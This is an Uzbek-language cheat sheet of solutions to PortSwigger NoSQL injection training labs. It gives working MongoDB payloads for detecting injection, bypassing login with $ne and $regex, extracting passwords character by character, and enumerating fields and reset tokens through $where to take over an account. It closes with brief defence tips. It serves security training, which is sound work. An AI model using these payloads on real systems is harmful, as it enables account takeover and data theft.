# NoSQL Injection — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com** (MongoDB). Ikki tur: syntax injection (`'`, JS condition) va
> operator injection (`$ne`, `$regex`, `$where`). Payloadni URL-encode qil (Burp Ctrl+U).

### Detection — APPRENTICE
`category` parametri MongoDB JS query'ga tushadi.
```
'                         → syntax error (sanitize yo'q)
Gifts'+'                  → error yo'q (injection bor)
Gifts' && 0 && 'x         → false (mahsulot yo'q)
Gifts' && 1 && 'x         → true (Gifts chiqadi)
Gifts'||1||'              → hamma (yashirin) mahsulot
```

### Authentication bypass (operator injection) — APPRENTICE
`POST /login` JSON. MongoDB operatorlari ishlaydi.
```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
> `$regex:"admin.*"` → administrator sifatida kirasan.

### Extracting data (JS condition) — PRACTITIONER
`GET /user/lookup?user=wiener` ga JS condition inject.
```
wiener' && this.password.length < 30 || 'a'=='b       ← uzunlik (8 chiqadi)
administrator' && this.password[§0§]=='§a§             ← Intruder Cluster bomb (pos0=0-7, pos1=a-z)
```

### Extracting unknown fields ($where + keys) — PRACTITIONER
`$ne` + `$where` JS → field nomlarini enumerate qilasan.
```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"1"}
```
```
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"     ← Cluster bomb: pos0=0-20, pos1=a-zA-Z0-9
"$where":"this.TOKENNAME.match('^.{§§}§§.*')"           ← token qiymatini chiqar
```
> Topilgan reset token: `GET /forgot-password?TOKENNAME=TOKENVALUE` → carlos parolini o'zgartir.

---

### Eslatma
Operator arsenali: `$ne`, `$eq`, `$gt`, `$regex`, `$where`, `$exists`. JSON body'da yoki
`param[$ne]=x` ko'rinishida. Himoya: input tip tekshiruvi, `$` ni rad etish, JS `$where` o'chirish.
Umumiy: 27 papka asosiy README.
